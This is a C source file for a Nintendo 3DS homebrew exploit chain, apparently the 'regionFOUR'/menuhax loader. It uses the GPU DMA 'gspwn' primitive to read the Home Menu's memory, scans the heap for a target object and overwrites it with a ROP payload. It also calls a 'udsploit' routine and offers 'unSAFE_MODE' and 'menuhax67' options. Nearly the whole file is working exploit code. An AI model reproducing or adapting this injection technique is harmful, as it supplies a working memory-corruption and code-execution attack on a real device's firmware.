#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include <ctr/APT.h>
#include <ctr/FS.h>
#include <ctr/GSP.h>
#include "text.h"
#ifndef LOADROPBIN
#include "menu_payload_regionfree.h"
#else
#include "menu_payload_loadropbin.h"
#endif

#ifndef OTHERAPP
#ifndef QRINSTALLER
#include "cn_save_initial_loader.h"
#endif
#endif

#ifdef LOADROPBIN
#include "menu_ropbin.h"
#endif

#include "../../build/constants.h"

#include "decompress.h"

#define HID_PAD (*(vu32*)0x7000001C)

typedef enum
{
	PAD_A = (1<<0),
	PAD_B = (1<<1),
	PAD_SELECT = (1<<2),
	PAD_START = (1<<3),
	PAD_RIGHT = (1<<4),
	PAD_LEFT = (1<<5),
	PAD_UP = (1<<6),
	PAD_DOWN = (1<<7),
	PAD_R = (1<<8),
	PAD_L = (1<<9),
	PAD_X = (1<<10),
	PAD_Y = (1<<11)
}PAD_KEY;

int _strlen(char* str)
{
	int l=0;
	while(*(str++))l++;
	return l;
}

void _strcpy(char* dst, char* src)
{
	while(*src)*(dst++)=*(src++);
	*dst=0x00;
}

void _strappend(char* str1, char* str2)
{
	_strcpy(&str1[_strlen(str1)], str2);
}

Result _srv_RegisterClient(Handle* handleptr)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x10002; //request header code
	cmdbuf[1]=0x20;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	return cmdbuf[1];
}

Result _initSrv(Handle* srvHandle)
{
	Result ret=0;
	if(svc_connectToPort(srvHandle, "srv:"))return ret;
	return _srv_RegisterClient(srvHandle);
}

Result _srv_getServiceHandle(Handle* handleptr, Handle* out, char* server)
{
	u8 l=_strlen(server);
	if(!out || !server || l>8)return -1;

	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x50100; //request header code
	_strcpy((char*)&cmdbuf[1], server);
	cmdbuf[3]=l;
	cmdbuf[4]=0x0;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	*out=cmdbuf[3];

	return cmdbuf[1];
}

Result _GSPGPU_ImportDisplayCaptureInfo(Handle* handle, GSP_CaptureInfo *captureinfo)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00180000; //request header code

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	ret = cmdbuf[1];

	if(ret==0)
	{
		memcpy(captureinfo, &cmdbuf[2], 0x20);
	}

	return ret;
}

u8 *GSP_GetTopFBADR()
{
	GSP_CaptureInfo capinfo;
	u32 ptr;

	#ifndef OTHERAPP
		Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	#else
		u32 *paramblk = (u32*)*((u32*)0xFFFFFFC);
		Handle* gspHandle=(Handle*)paramblk[0x58>>2];
	#endif

	if(_GSPGPU_ImportDisplayCaptureInfo(gspHandle, &capinfo)!=0)return NULL;

	ptr = (u32)capinfo.screencapture[0].framebuf0_vaddr;
	if(ptr>=0x1f000000 && ptr<0x1f600000)return NULL;//Don't return a ptr to VRAM if framebuf is located there, since writing there will only crash.

	return (u8*)ptr;
}

Result GSP_FlushDCache(u32* addr, u32 size)
{
	#ifndef OTHERAPP
		Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;
		Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
		return _GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, addr, size);
	#else
		Result (*_GSP_FlushDCache)(u32* addr, u32 size);
		u32 *paramblk = (u32*)*((u32*)0xFFFFFFC);
		_GSP_FlushDCache=(void*)paramblk[0x20>>2];
		return _GSP_FlushDCache(addr, size);
	#endif
}

Result GSP_InvalidateDCache(u32* addr, u32 size)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0] = 0x00090082; //request header code
	cmdbuf[1] = (u32)addr;
	cmdbuf[2] = size;
	cmdbuf[3] = 0;
	cmdbuf[4] = 0xFFFF8001;

	#ifndef OTHERAPP
		Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	#else
		u32 *paramblk = (u32*)*((u32*)0xFFFFFFC);
		Handle* gspHandle=(Handle*)paramblk[0x58>>2];
	#endif

	Result ret;
	if((ret = svc_sendSyncRequest(gspHandle))) return ret;

	return cmdbuf[1];
}

void renderString(char* str, int x, int y)
{
	u8 *ptr = GSP_GetTopFBADR();
	if(ptr==NULL)return;
	drawString(ptr,str,x,y);
	GSP_FlushDCache((u32*)ptr, 240*400*3);
}

void centerString(char* str, int y)
{
	renderString(str, 200-(_strlen(str)*4), y);
}


Result _GSPGPU_ReleaseRight(Handle handle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x170000; //request header code

	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

#define _aptSessionInit() \
	int aptIndex; \
	const char* aptSessionName; \
	for(aptIndex = 0; aptIndex < 3; aptIndex++)	{ \
	if (aptIndex == 0) aptSessionName = "APT:U"; \
	if (aptIndex == 1) aptSessionName = "APT:A"; \
	if (aptIndex == 2) aptSessionName = "APT:S"; \
	if(!_srv_getServiceHandle(srvHandle, &aptuHandle, (char*)aptSessionName)) break; \
	} \
	svc_closeHandle(aptuHandle);\

#define _aptOpenSession() \
	svc_waitSynchronization1(aptLockHandle, U64_MAX);\
	_srv_getServiceHandle(srvHandle, &aptuHandle, (char*)aptSessionName);\

#define _aptCloseSession()\
	svc_closeHandle(aptuHandle);\
	svc_releaseMutex(aptLockHandle);\

void doGspwn(u32* src, u32* dst, u32 size)
{
	#ifndef OTHERAPP
		Result (*nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue)(u32** sharedGspCmdBuf, u32* cmdAdr)=(void*)CN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue;
		u32 gxCommand[]=
		{
			0x00000004, //command header (SetTextureCopy)
			(u32)src, //source address
			(u32)dst, //destination address
			size, //size
			0xFFFFFFFF, // dim in
			0xFFFFFFFF, // dim out
			0x00000008, // flags
			0x00000000, //unused
		};

		u32** sharedGspCmdBuf=(u32**)(CN_GSPSHAREDBUF_ADR);
		nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue(sharedGspCmdBuf, gxCommand);
	#else
		Result (*gxcmd4)(u32 *src, u32 *dst, u32 size, u16 width0, u16 height0, u16 width1, u16 height1, u32 flags);
		u32 *paramblk = (u32*)*((u32*)0xFFFFFFC);
		gxcmd4=(void*)paramblk[0x1c>>2];
		gxcmd4(src, dst, size, 0, 0, 0, 0, 0x8);
	#endif
}

void clearScreen(u8 shade)
{
	u8 *ptr = GSP_GetTopFBADR();
	if(ptr==NULL)return;
	memset(ptr, shade, 240*400*3);
	GSP_FlushDCache((u32*)ptr, 240*400*3);
}

void drawTitleScreen(char* str)
{
	clearScreen(0x00);
	centerString(HAX_NAME_VERSION,0);
	centerString(BUILDTIME,10);
	renderString(str, 0, 20);
}

// Result _APT_HardwareResetAsync(Handle* handle)
// {
// 	u32* cmdbuf=getThreadCommandBuffer();
// 	cmdbuf[0]=0x4E0000; //request header code
	
// 	Result ret=0;
// 	if((ret=svc_sendSyncRequest(*handle)))return ret;
	
// 	return cmdbuf[1];
// }

#ifdef RECOVERY
void doRecovery()
{
	char str[512] =
		"Recovery mode\n\n"
		"please select your current firmware version\n";
	drawTitleScreen(str);

	u8 firmwareVersion[6] = {IS_N3DS, 9, 0, 0, 20, }; //[old/new][NUP0][NUP1][NUP2]-[NUP][region]

}
#endif

Result _APT_AppletUtility(Handle* handle, u32* out, u32 a, u32 size1, u8* buf1, u32 size2, u8* buf2)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x4B00C2; //request header code
	cmdbuf[1]=a;
	cmdbuf[2]=size1;
	cmdbuf[3]=size2;
	cmdbuf[4]=(size1<<14)|0x402;
	cmdbuf[5]=(u32)buf1;
	
	cmdbuf[0+0x100/4]=(size2<<14)|2;
	cmdbuf[1+0x100/4]=(u32)buf2;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	if(out)*out=cmdbuf[2];

	return cmdbuf[1];
}

Result _APT_NotifyToWait(Handle* handle, u32 a)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x430040; //request header code
	cmdbuf[1]=a;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_CancelLibraryApplet(Handle* handle, u32 is_end)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x3b0040; //request header code
	cmdbuf[1]=is_end;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_IsRegistered(Handle* handle, u32 app_id, u8* out)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x90040; //request header code
	cmdbuf[1]=app_id;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	if(out)*out = cmdbuf[2];

	return cmdbuf[1];
}

Result _APT_ReceiveParameter(Handle* handle, u32 app_id)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0xd0080; //request header code
	cmdbuf[1]=app_id;
	cmdbuf[2]=0x0;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_Finalize(Handle* handle, u32 a)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x40040; //request header code
	cmdbuf[1]=a;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_PrepareToCloseApplication(Handle* handle, u8 a)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x220040; //request header code
	cmdbuf[1]=a;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_CloseApplication(Handle* handle, u32 a, u32 b, u32 c)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x270044; //request header code
	cmdbuf[1]=a;
	cmdbuf[2]=0x0;
	cmdbuf[3]=b;
	cmdbuf[4]=(a<<14)|2;
	cmdbuf[5]=c;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_GetLockHandle(Handle* handle, u16 flags, Handle* lockHandle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x10040; //request header code
	cmdbuf[1]=flags;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;
	
	if(lockHandle)*lockHandle=cmdbuf[5];
	
	return cmdbuf[1];
}

void _aptExit()
{
	Handle _srvHandle;
	Handle* srvHandle = &_srvHandle;
	Handle aptLockHandle = 0;
	Handle aptuHandle=0x00;

	_initSrv(srvHandle);

	_aptSessionInit();

	#ifndef OTHERAPP
		aptLockHandle=*((Handle*)CN_APTLOCKHANDLE_ADR);
	#else
		_aptOpenSession();
		_APT_GetLockHandle(&aptuHandle, 0x0, &aptLockHandle);
		_aptCloseSession();
	#endif

	_aptOpenSession();
	_APT_CancelLibraryApplet(&aptuHandle, 0x1);
	_aptCloseSession();

	_aptOpenSession();
	_APT_NotifyToWait(&aptuHandle, 0x300);
	_aptCloseSession();

	u32 buf1;
	u8 buf2[4];

	_aptOpenSession();
	buf1 = 0x00;
	_APT_AppletUtility(&aptuHandle, NULL, 0x4, 0x1, (u8*)&buf1, 0x1, buf2);
	_aptCloseSession();

	u8 out = 1;
	while(out)
	{
		_aptOpenSession();
		_APT_IsRegistered(&aptuHandle, 0x401, &out); // wait until swkbd is dead
		_aptCloseSession();
	}

	_aptOpenSession();
	buf1 = 0x10;
	_APT_AppletUtility(&aptuHandle, NULL, 0x7, 0x4, (u8*)&buf1, 0x1, buf2);
	_aptCloseSession();

	_aptOpenSession();
	buf1 = 0x00;
	_APT_AppletUtility(&aptuHandle, NULL, 0x4, 0x1, (u8*)&buf1, 0x1, buf2);
	_aptCloseSession();


	_aptOpenSession();
	_APT_PrepareToCloseApplication(&aptuHandle, 0x1);
	_aptCloseSession();

	_aptOpenSession();
	_APT_CloseApplication(&aptuHandle, 0x0, 0x0, 0x0);
	_aptCloseSession();

	svc_closeHandle(aptLockHandle);
}

void inject_payload(u32* linear_buffer, u32 target_address, u32* ropbin_linear_buffer, u32 ropbin_size)
{
	u32 target_base = target_address & ~0xFF;
	u32 target_offset = target_address - target_base;

	//read menu memory
	{
		GSP_FlushDCache(linear_buffer, 0x00002000);
		
		doGspwn((u32*)(target_base), linear_buffer, 0x00002000);
	}

	svc_sleepThread(10000000); //sleep long enough for memory to be read

	//patch memdump and write it
	{
		u32* payload_src;
		u32 payload_size;

		#ifndef LOADROPBIN
			payload_src = (u32*)data_menu_payload_regionfree_bin;
			payload_size = data_menu_payload_regionfree_bin_length;
		#else
			payload_src = (u32*)data_menu_payload_loadropbin_bin;
			payload_size = data_menu_payload_loadropbin_bin_length;
		#endif

		u32* payload_dst = &(linear_buffer)[target_offset/4];

		//patch in payload
		int i;
		for(i=0; i<payload_size/4; i++)
		{
			const u32 val = payload_src[i];;
			if(val < 0xBABE0000+0x200 && val > 0xBABE0000-0x200)
			{
				payload_dst[i] = val + target_address - 0xBABE0000;
			}else if((val & 0xFFFFFF00) == 0xFADE0000){
				switch(val & 0xFF)
				{
					case 1:
						// source ropbin + bkp linear address
						payload_dst[i] = (u32)ropbin_linear_buffer;
						break;
					case 2:
						// ropbin + bkp size
						payload_dst[i] = ropbin_size;
						break;
				}
			}else if(val != 0xDEADCAFE){
				payload_dst[i] = val;
			}
		}

		GSP_FlushDCache(linear_buffer, 0x00002000);

		doGspwn(linear_buffer, (u32*)(target_base), 0x00002000);
	}

	svc_sleepThread(10000000); //sleep long enough for memory to be written
}

Result _GSPGPU_SetBufferSwap(Handle handle, u32 screenid, GSP_FramebufferInfo framebufinfo)
{
	Result ret=0;
	u32 *cmdbuf = getThreadCommandBuffer();

	cmdbuf[0] = 0x00050200;
	cmdbuf[1] = screenid;
	memcpy(&cmdbuf[2], &framebufinfo, sizeof(GSP_FramebufferInfo));
	
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result udsploit(u32*);

int main(u32 loaderparam, char** argv)
{
	#ifdef OTHERAPP
		u32 *paramblk = (u32*)loaderparam;
	#endif

	#ifndef OTHERAPP
		Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
		u32* linear_buffer = (u32*)0x14100000;
	#else
		Handle* gspHandle=(Handle*)paramblk[0x58>>2];
		u32* linear_buffer = (u32*)((((u32)paramblk) + 0x1000) & ~0xfff);
	#endif

	// put framebuffers in linear mem so they're writable
	u8* top_framebuffer = &linear_buffer[0x00100000/4];
	u8* low_framebuffer = &top_framebuffer[0x00046500];
	_GSPGPU_SetBufferSwap(*gspHandle, 0, (GSP_FramebufferInfo){0, (u32*)top_framebuffer, (u32*)top_framebuffer, 240 * 3, (1<<8)|(1<<6)|1, 0, 0});
	_GSPGPU_SetBufferSwap(*gspHandle, 1, (GSP_FramebufferInfo){0, (u32*)low_framebuffer, (u32*)low_framebuffer, 240 * 3, 1, 0, 0});

	int line=10;
	drawTitleScreen("");

	#ifdef RECOVERY
		u32 PAD = HID_PAD;
		if((PAD & KEY_L) && (PAD & KEY_R)) doRecovery();
	#endif

	#ifndef OTHERAPP
	#ifndef QRINSTALLER
		if(loaderparam)installerScreen(loaderparam);
	#endif
	#endif

	#ifdef UDSPLOIT
	{
		Result ret = 0;

		s64 tmp = 0;
		ret = svc_getSystemInfo(&tmp, 0, 1);

		MemInfo minfo;
		PageInfo pinfo;
		ret = svc_queryMemory(&minfo, &pinfo, 0x08000000);

		#define UDS_ERROR_INDICATOR 0x00011000

		ret = udsploit(linear_buffer);
		ret ^= UDS_ERROR_INDICATOR;

		if(ret ^ UDS_ERROR_INDICATOR)
		{
			renderString("something failed :(", 8, 80);
			if(ret == (0xc9411002 ^ UDS_ERROR_INDICATOR)) renderString("please try again with wifi enabled", 8, 90);
			else renderString("please report error code above", 8, 90);
			while(1);
		}
	}
	#endif

	// regionfour stuff
	drawTitleScreen("searching for target...");

	//search for target object in home menu's linear heap
	const u32 start_addr = FIRM_LINEARSYSTEM;
	const u32 end_addr = FIRM_LINEARSYSTEM + 0x01000000;
	const u32 block_size = 0x00010000;
	const u32 block_stride = block_size-0x100; // keep some overlap to make sure we don't miss anything
	
	int targetProcessIndex = 1;

	#ifdef LOADROPBIN
		u32 *ptr32 = (u32*)data_menu_ropbin_bin;
		u32* ropbin_linear_buffer = &((u8*)linear_buffer)[block_size];
		u32* ropbin_bkp_linear_buffer = &((u8*)ropbin_linear_buffer)[MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR];

		// Decompress data_menu_ropbin_bin into homemenu linearmem.
		lz11Decompress(&data_menu_ropbin_bin[4], (u8*)ropbin_linear_buffer, ptr32[0] >> 8);

		// copy un-processed ropbin to backup location
		memcpy(ropbin_bkp_linear_buffer, ropbin_linear_buffer, MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR);

		GSP_FlushDCache(ropbin_linear_buffer, (MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR) * 2);

		// // copy parameter block
		// memset(ropbin_linear_buffer, 0x00, MENU_PARAMETER_SIZE);
		// GSP_FlushDCache(ropbin_linear_buffer, MENU_PARAMETER_SIZE);
		// doGspwn(ropbin_linear_buffer, (u32*)(MENU_PARAMETER_BUFADR), MENU_PARAMETER_SIZE);
		// svc_sleepThread(20*1000*1000);
	#endif

	int cnt = 0;
	u32 block_start;
	u32 target_address = start_addr;
	for(block_start=start_addr; block_start<end_addr; block_start+=block_stride)
	{
		//read menu memory
		{
			GSP_FlushDCache(linear_buffer, block_size);
			
			doGspwn((u32*)(block_start), linear_buffer, block_size);
		}

		svc_sleepThread(1000000); //sleep long enough for memory to be read

		int i;
		u32 end = block_size/4-0x10;
		for(i = 0; i < end; i++)
		{
			const u32* adr = &(linear_buffer)[i];
			if(adr[2] == 0x5544 && adr[3] == 0x80 && adr[6]!=0x0 && adr[0x1F] == 0x6E4C5F4E)break;
		}

		if(i < end)
		{
			drawTitleScreen("searching for target...\n    target locked ! engaging.");

			target_address = block_start + i * 4;

			#ifdef LOADROPBIN
				inject_payload(linear_buffer, target_address + 0x18, ropbin_linear_buffer, (MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR) * 2);
			#else
				inject_payload(linear_buffer, target_address + 0x18, NULL, 0);
			#endif

			block_start = target_address + 0x10 - block_stride;
			cnt++;

			break;
		}
	}

	svc_sleepThread(100000000); //sleep long enough for memory to be written

	if(cnt)
	{
		#ifndef LOADROPBIN
			drawTitleScreen("\n   regionFOUR is ready.\n   insert your gamecard and press START.");
		#else
			drawTitleScreen("Select exploit:\n\n   X: unSAFE_MODE\n   Y+DPAD DOWN: menuhax67\n   START: Exit\n\n(Green Screen = SUCCESS)\n(Red Screen = FAILURE)\n\nOnly use menuhax67 if you are being told to\nor you know what you are doing!");
		#endif
	}else{
		drawTitleScreen("\n   failed to locate takeover object :(");
		while(1);
	}
	
	//disable GSP module access
	_GSPGPU_ReleaseRight(*gspHandle);
	svc_closeHandle(*gspHandle);

	//exit to menu
	_aptExit();

	svc_exitProcess();

	while(1);
	return 0;
}
